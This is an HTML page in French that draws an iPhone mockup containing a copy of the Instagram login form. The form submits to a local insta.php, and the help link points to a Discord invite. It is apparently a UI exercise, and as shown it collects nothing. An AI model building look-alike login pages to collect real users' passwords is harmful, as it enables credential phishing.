<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <META HTTP-EQUIV="Refresh" CONTENT="; URL=http://localhost/test/insta.php">
    <link href="https://fonts.googleapis.com/css2?family=Monoton&display=swap" rel="stylesheet">
    <title>Document</title>
    <script>
        function inputHandler() {
            var input = document.getElementById("submit");
            if (input.value.length > 0) {
            input.style.background = "rgba( 51, 165, 255, 0.5)";
            input.style.color = "rgba( 255, 255, 255, 0.5)";

            } else {
            input.style.background = "rgba( 51, 165, 255, 1)";
            input.style.color = "rgba( 255, 255, 255, 1)";
            }
        }
    </script>
</head>


<body>
<div class="iphone">
    <div class="iphone14">
        <div class="homescreen">
            <div class="operator-name">WxA</div>
            <div class="dynamic-island"></div>
            <div class="dynamic-island-camera"></div>
            <div id="operator-icons" class="operator-icons" onclick="navgere()">
                <i class="bi bi-reception-4"></i>
                5G
                <div class="battery">100</div> <!-- niveau de la batterie -->
            </div>
            <div class="date-area">
            </div>
            <form action="insta.php">
                <div class="bouton">
                    <img src="https://cdn.discordapp.com/attachments/997896077023907924/1070063873522151505/iu.png" alt="">
                    <input oninput="inputHandler()" id="iden" type="text" placeholder="Num. télephone, e-mail ou nom d'utilisateur">
                    <input oninput="inputHandler()" id="password" type="password" placeholder="Mot de passe">
                    <input id="submit" type="submit" placeholder="Connexion">
                </div>
            </form>
            <div class="aide">
                <p>Information de connexion oubliées ? <a href="https://discord.gg/qCtMEdAvjQ"><strong>Obtenez de l'aide pour vous connecter.</strong> </a></p>
            </div>
            <footer>
                <p>Vous n'avez pas de compte ? <a href="inscription.php"><strong>Inscrivez-vous.</strong> </a></p>
            </footer>
            <div class="line"></div>
        </div>
    </div>
</div>

</body>
<style>

.bouton {
    margin-top: 200px;
    margin-left: 25px;
}
.bouton img {
    position: absolute;
    width: 125px;
    left: 27.5%;
}
.bouton input {
    position: relative;
    width: 260px;
    height: 37.5px;
    border-radius: 2.5px;
    background: transparent;
    border: none;
    top: 50px;
    margin-top: 15px;
    background: grey;
    color: white;
}
#password::placeholder, #submit::placeholder, #iden::placeholder {
    color: white;
    margin-left: 5px;
}
#submit {
    border-radius: 0px;
    background: rgba( 51, 165, 255, 0.5);
    cursor: pointer;
    color:  rgba( 255, 255, 255, 0.5);
}
footer {
    position: absolute;
    color: rgba( 255, 255, 255, 0.5);
    bottom: 25px;
    left: 35px;
    font-size: 11px;
}
.aide {
    position: absolute;
    color: rgba( 255, 255, 255, 0.5);
    top: 69%;
    left: 15px;
    font-size: 11px;
    text-align: center;
}


*{
    padding: 0;
    font-family: arial;
    margin: 0;
}

body{
    flex-direction: column;
    justify-content: center;
    align-items: center;
    height: 100vh;
    background: #c2c3c9;
    display: flex;
}

.iphone{
    border-radius: 50px;
    border: 4px solid #3b444b;
}

a{
    color: white;
    text-decoration: none;
}

.iphone14{
    height: 600px;
    border: 5px solid black;
    background: rgb(0, 0, 0);
    background-repeat: no-repeat;
    background-size: 301px 600px;
    border-radius: 47px;
    position: relative;
    transition: all .7s;
    width: 300px; 
}

.fond {
    width: 300px;
    height: 600px;
    width: auto;
    border-radius: 47px;
    position: absolute;
}

.iphonehomescreen{
    opacity: 0;
    transition: all .2s;
    z-index: -1;
    position: absolute;
}

.iphone14home{
    height: 600px;
    border: 5px solid black;
    background: white;
    background-image: url("img-bg.webp");
    background-repeat: no-repeat;
    background-size: 301px 600px;
    border-radius: 47px;
    position: relative;
    transition: all .2s;
    width: 300px;
}

.operator-name{
    top: 16px;
    left: 30px;
    font-size: 14px;
    color: white;
    position: absolute;
}

.dynamic-island{
    width: 100px;
    height: 25px;
    background: black;
    border-radius: 50px;
    margin: 0 auto;
    margin-top: -50px;
    position: absolute;
    left: 100px;
    top: 60px;
    z-index: 99999;
    transition: all .2s;
}

.dynamic-island-camera{
    color: white;
    position: absolute;
    top: 18px;
    right: 110px;
    background: #121212;
    box-shadow: 0 0 1px grey;
    width: 10px;
    height: 10px;
    z-index: 99999;
    transition: all .2s;
    border-radius: 50px;
}

.operator-icons{
    top: 16px;
    right: 50px;
    font-size: 14px;
    transition: all .2s;
    color: white;
    cursor: pointer;
    z-index: 9999998;
    position: absolute;
}

.battery{
    height: 10px;
    border: 2px solid #fff;
    border-radius: 4px;
    font-size: 10px;
    text-align: center;
    color: #000;
    background: #Fefefe;
    font-weight: bold;
    position: absolute;
    top: 0px;
    right: -28px;
    width: 20px;
}
.line{
    position: absolute;
    bottom: 10px;
    width: 100px;
    height: 5px;
    border-radius: 50px;
    background: #fff;
    left: 100px;
    transition: all .2s;
    cursor: pointer;
}
</style>

</html>